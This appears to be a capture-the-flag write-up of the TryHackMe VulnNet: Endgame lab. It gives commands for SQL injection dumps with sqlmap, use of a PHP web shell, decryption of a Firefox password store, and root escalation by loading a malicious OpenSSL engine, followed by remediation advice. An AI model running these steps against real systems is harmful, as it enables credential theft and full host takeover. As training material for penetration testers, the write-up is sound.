---
title: "TryHackMe: VulnNet: Endgame"
date: 2026-07-05 23:36:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - web
  - sql-injection
  - typo3
  - credential-reuse
  - firefox
  - file-capabilities
  - privilege-escalation
description: >-
  VulnNet: Endgame progressed from virtual-host discovery and SQL injection
  through TYPO3 web-shell access, Firefox credential recovery, and OpenSSL
  capability abuse for root.
author: lenovolegion7
media_subpath: /images/tryhackme_vulnnet_endgame
image:
  path: room_image.webp
  alt: "Original TryHackMe VulnNet Endgame room artwork"
toc: true
comments: false
---

VulnNet: Endgame was compromised through a chained web and Linux attack path. Virtual-host discovery exposed an internal blog API, SQL injection disclosed TYPO3 administrator data, authenticated CMS abuse produced command execution as `www-data`, browser credentials enabled an SSH pivot to `system`, and a capability-bearing OpenSSL binary ultimately yielded a root shell.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe VulnNet Endgame room card](room_card.webp){: w="294" h="267" .shadow }](https://tryhackme.com/room/vulnnetendgame){: .center }

## Initial Enumeration

Initial scanning exposed only SSH and HTTP:

```console
$ nmap -Pn -sC -sV -T4 TARGET_IP
22/tcp open  ssh   OpenSSH 7.6p1
80/tcp open  http  Apache httpd 2.4.29
```

The HTTP service instructed visitors to use the `vulnnet.thm` hostname. The discovered names were mapped locally for continued testing:

```console
TARGET_IP vulnnet.thm api.vulnnet.thm blog.vulnnet.thm shop.vulnnet.thm admin1.vulnnet.thm
```

## Validated Attack Path

1. **Discovery** — Host-header fuzzing identified the `api`, `blog`, `shop`, and `admin1` virtual hosts.
2. **Database access** — JavaScript on the blog disclosed an internal API endpoint whose `blog` parameter was vulnerable to SQL injection.
3. **Credential recovery** — Database contents exposed a TYPO3 backend administrator record; the recovered Argon2i hash was cracked to `[REDACTED]`.
4. **Initial access** — The TYPO3 administrator context was used to relax upload controls and place a PHP web shell, producing command execution as `www-data`.
5. **Lateral movement** — A readable Firefox profile disclosed a saved password, allowing SSH access as the `system` user.
6. **Privilege escalation** — A custom OpenSSL binary with effective Linux capabilities loaded a malicious engine and spawned a root shell.

> **Result:** The full chain produced root-level access and validated both user and root objectives as `THM{[REDACTED]}`.
{: .prompt-danger }

## Virtual Host Discovery

Host-header fuzzing expanded the attack surface beyond the default site:

```console
$ ffuf -u http://TARGET_IP/ \
  -H 'Host: FUZZ.vulnnet.thm' \
  -w subdomains.txt

api
blog
shop
admin1
```

Static JavaScript from the blog referenced the following API route:

```text
http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1
```

## SQL Injection and TYPO3 Credential Recovery

The `blog` parameter accepted boolean-based, time-based, and UNION-style SQL injection. Database enumeration exposed the `blog` and `vn_admin` databases, including the TYPO3 backend user table:

```console
$ sqlmap -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' --dbs

$ sqlmap -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' \
  -D vn_admin -T be_users --dump
```

The backend user `chris_w` had an Argon2i password hash. Candidate passwords recovered from the database enabled the hash to be cracked:

```text
username: chris_w
password hash: [REDACTED]
password: [REDACTED]
```

This transformed an unauthenticated API injection into authenticated TYPO3 administrator access.

## Authenticated CMS Abuse and Initial Access

After authentication, TYPO3 upload restrictions were weakened and a PHP web shell was placed in the writable `fileadmin` area:

```console
$ curl -i 'http://admin1.vulnnet.thm/fileadmin/shell.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The result confirmed operating-system command execution in the Apache service context.

## Firefox Credential Recovery and SSH Pivot

Local enumeration showed that the `system` user's Firefox profile was readable. The profile contained `logins.json`, `key4.db`, and `cert9.db`, allowing the saved credential to be decrypted on the tester system:

```console
$ tar -czf ff-profile.tgz \
  -C /home/system/.mozilla/firefox \
  2fjnrwth.default-release

$ python3 decrypt_firefox_nss.py \
  loot/firefox/2fjnrwth.default-release

chris_w@vulnnet.thm : [REDACTED]
```

The recovered password was reusable for the local account:

```console
$ ssh system@TARGET_IP
$ cat ~/user.txt
THM{[REDACTED]}
```

## Privilege Escalation Through OpenSSL Capabilities

Capability enumeration identified a custom OpenSSL binary under the user's home directory:

```console
$ getcap -r / 2>/dev/null
/home/system/Utils/openssl =ep
```

The binary could access privileged files and load dynamic OpenSSL engines. A malicious engine compiled on the tester system was transferred to `/tmp` and loaded through the capable binary:

```console
$ /home/system/Utils/openssl engine \
  -pre SO_PATH:/tmp/evil.so \
  -pre ID:evil \
  -pre LIST_ADD:1 \
  -pre LOAD dynamic
```

The engine constructor executed a privileged shell:

```console
# id
uid=0(root) gid=0(root) groups=0(root),1000(system)

# cat /root/thm-flag/root.txt
THM{[REDACTED]}
```

## Security Impact

The validated chain demonstrated complete compromise:

- **Database confidentiality:** unauthenticated SQL injection exposed application databases and credential material.
- **Application control:** recovered TYPO3 administrator access permitted security-setting changes and executable uploads.
- **Host command execution:** the uploaded web shell provided commands as `www-data`.
- **Credential exposure:** readable browser and application configuration data enabled further account compromise.
- **Root compromise:** unsafe capabilities on a user-accessible OpenSSL binary bypassed the normal privilege boundary.

A production deployment with equivalent weaknesses could expose application data, administrative credentials, source code, secrets, and all files accessible to root.

## Remediation

1. Replace vulnerable SQL construction with parameterized queries and strict server-side type validation.
2. Restrict each application database principal to only the schemas and operations it requires.
3. Rotate all exposed TYPO3, database, SSH, and browser-stored credentials; enforce unique passphrases and MFA for administrators.
4. Prevent PHP execution in writable upload locations and monitor changes to TYPO3 upload controls.
5. Protect home directories and browser profiles with restrictive ownership and permissions; do not store privileged passwords in browser stores on shared systems.
6. Remove unnecessary capabilities from `/home/system/Utils/openssl` and audit all capability-bearing files with `getcap -r /`.
7. Keep powerful system utilities out of user-owned directories and constrain dynamic module loading with platform controls where feasible.
8. Restrict configuration-file access and move application secrets into an appropriately protected secret-management mechanism.

## Cleanup

The source assessment describes cleanup actions that should be performed but does not record them as completed. A controlled cleanup should therefore include:

- removing the uploaded PHP web shell;
- deleting temporary payloads and the malicious OpenSSL engine from `/tmp`;
- restoring the original TYPO3 upload restrictions;
- rotating every recovered credential;
- verifying that capability assignments match an approved baseline.

These actions should be coordinated with the system owner and followed by a focused retest.

## Lessons Learned

- Small virtual-host clues can reveal substantially different applications and trust boundaries.
- SQL injection impact increases sharply when an API principal can read unrelated administrative databases.
- Strong password hashing cannot compensate for reused or predictable credentials.
- Writable web directories must never permit server-side script execution.
- Browser credential stores are sensitive assets and require host-level access controls.
- Linux file capabilities on extensible, user-accessible binaries can be equivalent to direct root access.
